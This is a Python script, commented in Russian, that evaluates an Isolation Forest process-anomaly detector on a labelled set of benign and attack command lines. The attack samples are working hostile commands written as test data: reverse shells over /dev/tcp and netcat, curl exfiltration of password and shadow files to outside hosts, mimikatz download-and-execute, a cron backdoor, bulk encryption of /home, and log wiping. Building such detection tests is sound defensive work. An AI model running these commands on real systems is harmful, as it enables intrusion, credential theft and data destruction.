"""
evaluate_model.py — Оценка качества ML-модели Isolation Forest.

Использует размеченный датасет (нормальные события + известные атаки)
для расчёта Precision, Recall, F1-Score, Accuracy.

Запуск:
    python3 evaluate_model.py
"""

import json
import numpy as np
from app.anomaly_detector import AnomalyDetector
from mitre_mapper import MitreMapper

detector = AnomalyDetector()
mitre = MitreMapper()

# ─── Размеченный тестовый датасет ──────────────────────────────────────────
# label=0 → нормальное, label=1 → атака

LABELED_DATASET = [
    # ── НОРМАЛЬНЫЕ (label=0) ──
    {"process_name": "chrome.exe",     "command_line": "chrome.exe --type=renderer --no-sandbox",                        "user": "alice",    "label": 0},
    {"process_name": "firefox.exe",    "command_line": "firefox.exe -contentproc --type=tab",                            "user": "bob",      "label": 0},
    {"process_name": "explorer.exe",   "command_line": "C:\\Windows\\explorer.exe",                                      "user": "system",   "label": 0},
    {"process_name": "svchost.exe",    "command_line": "svchost.exe -k netsvcs -p",                                      "user": "system",   "label": 0},
    {"process_name": "python.exe",     "command_line": "python manage.py runserver 127.0.0.1:8000",                      "user": "dev",      "label": 0},
    {"process_name": "node.exe",       "command_line": "node server.js --port 3000",                                     "user": "dev",      "label": 0},
    {"process_name": "git.exe",        "command_line": "git pull origin main",                                           "user": "dev",      "label": 0},
    {"process_name": "nginx",          "command_line": "nginx: worker process",                                          "user": "www-data", "label": 0},
    {"process_name": "sshd",           "command_line": "/usr/sbin/sshd -D",                                              "user": "root",     "label": 0},
    {"process_name": "systemd",        "command_line": "/lib/systemd/systemd --switched-root --system",                  "user": "root",     "label": 0},
    {"process_name": "python3",        "command_line": "python3 /opt/app/worker.py --config /etc/app/config.yaml",       "user": "appuser",  "label": 0},
    {"process_name": "apt",            "command_line": "apt-get update",                                                 "user": "root",     "label": 0},
    {"process_name": "Finder",         "command_line": "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",  "user": "charlie",  "label": 0},
    {"process_name": "Safari",         "command_line": "/Applications/Safari.app/Contents/MacOS/Safari",                 "user": "charlie",  "label": 0},
    {"process_name": "Teams.exe",      "command_line": "Teams.exe --process=gpu",                                        "user": "alice",    "label": 0},
    {"process_name": "WINWORD.EXE",    "command_line": "WINWORD.EXE /n",                                                 "user": "alice",    "label": 0},
    {"process_name": "rsync",          "command_line": "rsync -avz /var/backups/ backup@192.168.1.10:/backups/",         "user": "backup",   "label": 0},
    {"process_name": "journalctl",     "command_line": "journalctl -u nginx --since today",                              "user": "sysadmin", "label": 0},
    {"process_name": "softwareupdate", "command_line": "softwareupdate --list",                                          "user": "root",     "label": 0},
    {"process_name": "curl",           "command_line": "curl https://github.com/repo/archive.tar.gz -o /tmp/pkg.tar.gz", "user": "dev",      "label": 0},

    # ── АТАКИ (label=1) ──
    {"process_name": "powershell.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAA=", "user": "alice",    "label": 1},
    {"process_name": "cmd.exe",        "command_line": "whoami /all & net user & ipconfig /all & systeminfo",            "user": "bob",      "label": 1},
    {"process_name": "curl.exe",       "command_line": "curl -X POST http://185.220.101.45/exfiltrate --data @C:\\Users\\alice\\Documents\\passwords.txt", "user": "alice", "label": 1},
    {"process_name": "bitsadmin.exe",  "command_line": "bitsadmin /transfer myJob /download /priority high http://evil.c2server.ru/payload.exe C:\\temp\\payload.exe", "user": "system", "label": 1},
    {"process_name": "rundll32.exe",   "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";GetObject(\"script:http://10.0.0.5/exploit.sct\")", "user": "alice", "label": 1},
    {"process_name": "cmd.exe",        "command_line": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\temp\\malware.exe /f", "user": "bob", "label": 1},
    {"process_name": "schtasks.exe",   "command_line": "schtasks /create /tn SystemHealthCheck /tr C:\\Windows\\Temp\\updater.exe /sc onlogon /ru SYSTEM /f", "user": "alice", "label": 1},
    {"process_name": "powershell.exe", "command_line": "powershell -exec bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.100/mimikatz.ps1'); sekurlsa::logonpasswords\"", "user": "alice", "label": 1},
    {"process_name": "cmd.exe",        "command_line": "wevtutil cl System & wevtutil cl Security & wevtutil cl Application", "user": "alice", "label": 1},
    {"process_name": "bash",           "command_line": "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",                  "user": "www-data", "label": 1},
    {"process_name": "sh",             "command_line": "nc -e /bin/bash 10.10.10.5 1337",                               "user": "nobody",   "label": 1},
    {"process_name": "bash",           "command_line": "crontab -l | { cat; echo \"* * * * * curl -s http://10.0.0.1/backdoor.sh | bash\"; } | crontab -", "user": "www-data", "label": 1},
    {"process_name": "bash",           "command_line": "cat /etc/shadow > /tmp/.shadow_backup && curl -F file=@/tmp/.shadow_backup http://attacker.com/collect", "user": "root", "label": 1},
    {"process_name": "bash",           "command_line": "chmod +s /tmp/evil_binary && /tmp/evil_binary",                 "user": "www-data", "label": 1},
    {"process_name": "bash",           "command_line": "history -c; unset HISTFILE; export HISTSIZE=0",                 "user": "hacker",   "label": 1},
    {"process_name": "nmap",           "command_line": "nmap -sV -sC -O 192.168.0.0/24 -oN /tmp/.scan_results",        "user": "www-data", "label": 1},
    {"process_name": "bash",           "command_line": "echo 'ssh-rsa AAAAB3Nza...evil' >> /root/.ssh/authorized_keys", "user": "root",     "label": 1},
    {"process_name": "python3",        "command_line": "python3 -c \"import os; [os.system(f'openssl enc -aes-256-cbc -in {f} -out {f}.enc -k s3cr3t') for f in os.listdir('/home')]\"", "user": "root", "label": 1},
    {"process_name": "zsh",            "command_line": "zsh -i >& /dev/tcp/185.100.87.50/4444 0>&1",                   "user": "charlie",  "label": 1},
    {"process_name": "bash",           "command_line": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 9001 > /tmp/f", "user": "nobody", "label": 1},
]

THRESHOLD = 0.12  # ниже порога → нормально, выше → аномалия


def evaluate():
    y_true, y_pred, scores = [], [], []

    for item in LABELED_DATASET:
        event = {k: v for k, v in item.items() if k != "label"}
        techniques = mitre.get_attack_info(event["command_line"])
        boost = mitre.get_severity_boost(techniques)
        score = detector.score(event, mitre_boost=boost)

        predicted = 1 if score >= THRESHOLD else 0
        y_true.append(item["label"])
        y_pred.append(predicted)
        scores.append(score)

    y_true = np.array(y_true)
    y_pred = np.array(y_pred)

    tp = int(np.sum((y_pred == 1) & (y_true == 1)))
    tn = int(np.sum((y_pred == 0) & (y_true == 0)))
    fp = int(np.sum((y_pred == 1) & (y_true == 0)))
    fn = int(np.sum((y_pred == 0) & (y_true == 1)))

    precision  = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall     = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    f1         = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0
    accuracy   = (tp + tn) / len(y_true)
    fpr        = fp / (fp + tn) if (fp + tn) > 0 else 0.0

    metrics = {
        "accuracy":   round(accuracy  * 100, 2),
        "precision":  round(precision * 100, 2),
        "recall":     round(recall    * 100, 2),
        "f1_score":   round(f1        * 100, 2),
        "fpr":        round(fpr       * 100, 2),
        "tp": tp, "tn": tn, "fp": fp, "fn": fn,
        "total_samples": len(y_true),
        "attack_samples": int(y_true.sum()),
        "normal_samples": int(len(y_true) - y_true.sum()),
        "threshold": THRESHOLD,
        "algorithm": "Isolation Forest",
        "features": 25,
    }

    with open("model_metrics.json", "w") as f:
        json.dump(metrics, f, indent=2)

    print("\n" + "═"*50)
    print("  ML MODEL EVALUATION — Isolation Forest")
    print("═"*50)
    print(f"  Dataset : {metrics['total_samples']} samples ({metrics['normal_samples']} normal / {metrics['attack_samples']} attacks)")
    print(f"  Threshold: {THRESHOLD}")
    print("─"*50)
    print(f"  Accuracy : {metrics['accuracy']}%")
    print(f"  Precision: {metrics['precision']}%")
    print(f"  Recall   : {metrics['recall']}%")
    print(f"  F1-Score : {metrics['f1_score']}%")
    print(f"  FPR      : {metrics['fpr']}%")
    print("─"*50)
    print(f"  TP={tp}  TN={tn}  FP={fp}  FN={fn}")
    print("═"*50)
    print(f"\n✅ Метрики сохранены в model_metrics.json\n")
    return metrics


if __name__ == "__main__":
    evaluate()
